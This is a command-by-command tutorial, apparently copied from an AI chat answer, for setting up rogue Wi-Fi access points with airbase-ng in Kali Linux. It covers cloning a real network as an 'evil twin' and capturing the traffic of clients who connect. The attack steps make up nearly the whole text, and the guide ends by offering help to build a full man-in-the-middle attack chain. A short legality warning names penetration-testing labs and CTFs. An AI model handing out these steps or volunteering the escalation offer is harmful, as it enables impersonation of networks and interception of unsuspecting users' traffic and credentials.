üîß Step-by-Step Guide: How to Use Airbase-ng in Kali Linux
‚úÖ 1. Put Wi-Fi Adapter into Monitor Mode
bash
Copy
Edit
sudo airmon-ng start wlan0
Replace wlan0 with your Wi-Fi interface.

Monitor mode interface will be something like wlan0mon.

‚úÖ 2. Choose a Target Channel (Optional)
Use airodump-ng to scan and choose a target AP or client:

bash
Copy
Edit
sudo airodump-ng wlan0mon
Note the channel and BSSID of the target if you want to clone a specific network.

üî• 3. Start Airbase-ng to Create a Fake Access Point
üî∏ Example 1: Create Open Rogue AP
bash
Copy
Edit
sudo airbase-ng -e "Free_WiFi" -c 6 wlan0mon
-e is the ESSID (name of the fake AP).

-c is the channel (you can change to match a real AP or random).

wlan0mon is your monitor interface.

üî∏ Example 2: Clone Real AP (Evil Twin)
bash
Copy
Edit
sudo airbase-ng -a <target-BSSID> -e "<target-SSID>" -c <channel> wlan0mon
Replace:

<target-BSSID> with real AP MAC

<target-SSID> with the same SSID

<channel> to match original AP

‚úÖ 4. Set Up Network Configuration (Optional)
After launching Airbase-ng, a new interface like at0 will appear. You can configure it:

bash
Copy
Edit
sudo ifconfig at0 up
sudo ifconfig at0 10.0.0.1 netmask 255.255.255.0
Then set up DHCP and routing (optional, for internet access or captive portal):

bash
Copy
Edit
sudo service isc-dhcp-server start
Or use dnsmasq, iptables, or hostapd depending on your attack setup.

‚úÖ 5. Monitor and Collect Data
Clients that connect to your fake AP can be monitored:

bash
Copy
Edit
sudo wireshark
Or capture traffic with:

bash
Copy
Edit
sudo tcpdump -i at0
‚ö†Ô∏è Warning
Using Airbase-ng to impersonate Wi-Fi networks without permission is illegal. Always use it in authorized environments like:

Penetration Testing Labs

CTFs

Client-authorized security audits

üìå Useful Flags Summary
Option	Description
-e <SSID>	Set the fake SSID
-c <channel>	Set the wireless channel
-a <BSSID>	Clone real AP's MAC address
-P	Respond to probe requests (for karma)
-Z	Use WPA encryption simulation (not real)

If you need help building a full MITM attack chain (with Airbase-ng + iptables + dnsmasq or captive portals), let me know!
